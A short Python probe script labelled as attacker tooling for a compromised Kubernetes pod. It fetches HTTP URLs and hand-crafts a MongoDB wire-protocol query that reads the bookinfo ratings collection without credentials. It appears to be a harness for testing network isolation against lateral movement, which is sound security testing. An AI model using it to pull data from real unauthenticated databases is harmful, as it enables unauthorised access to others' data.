# attacker tooling, runs inside the compromised pod: python - http URL | python - mongo HOST PORT
# prints "OK <detail>" or "FAIL <reason>"
import json, socket, struct, sys, urllib.request

TIMEOUT = 4


def bson_enc(d):
    body = b""
    for k, v in d.items():
        v = v.encode() + b"\0"
        body += b"\x02" + k.encode() + b"\0" + struct.pack("<i", len(v)) + v
    return struct.pack("<i", len(body) + 5) + body + b"\0"


def bson_dec(b, i=4, end=None, arr=False):
    end = end or struct.unpack_from("<i", b)[0] - 1
    out = {}
    while i < end:
        t, i = b[i], i + 1
        j = b.index(b"\0", i)
        k, i = b[i:j].decode(), j + 1
        if t == 0x01:
            v, i = struct.unpack_from("<d", b, i)[0], i + 8
        elif t == 0x02:
            n = struct.unpack_from("<i", b, i)[0]
            v, i = b[i + 4:i + 3 + n].decode(), i + 4 + n
        elif t in (0x03, 0x04):
            n = struct.unpack_from("<i", b, i)[0]
            v, i = bson_dec(b, i + 4, i + n - 1, t == 0x04), i + n
        elif t == 0x07:
            v, i = b[i:i + 12].hex(), i + 12
        elif t == 0x08:
            v, i = bool(b[i]), i + 1
        elif t == 0x10:
            v, i = struct.unpack_from("<i", b, i)[0], i + 4
        elif t in (0x09, 0x11, 0x12):
            v, i = struct.unpack_from("<q", b, i)[0], i + 8
        else:
            break
        out[k] = v
    return list(out.values()) if arr else out


def mongo(host, port):
    # OP_MSG find on test.ratings, no credentials (bookinfo mongodb runs without auth)
    doc = bson_enc({"find": "ratings", "$db": "test"})
    msg = struct.pack("<I", 0) + b"\0" + doc
    s = socket.create_connection((host, int(port)), TIMEOUT)
    s.settimeout(TIMEOUT)
    s.sendall(struct.pack("<iiii", 16 + len(msg), 1, 0, 2013) + msg)
    n = struct.unpack("<i", s.recv(4, socket.MSG_WAITALL))[0]
    data = b""
    while len(data) < n - 4:
        data += s.recv(n - 4 - len(data))
    reply = bson_dec(data[17:])
    return "read test.ratings: " + json.dumps(reply.get("cursor", {}).get("firstBatch", reply))


def http(url):
    r = urllib.request.urlopen(url, timeout=TIMEOUT)
    return f"HTTP {r.status} {r.read(200).decode(errors='replace')}"


try:
    print("OK", {"http": http, "mongo": mongo}[sys.argv[1]](*sys.argv[2:]))
except Exception as e:
    print("FAIL", type(e).__name__, e)
    sys.exit(1)
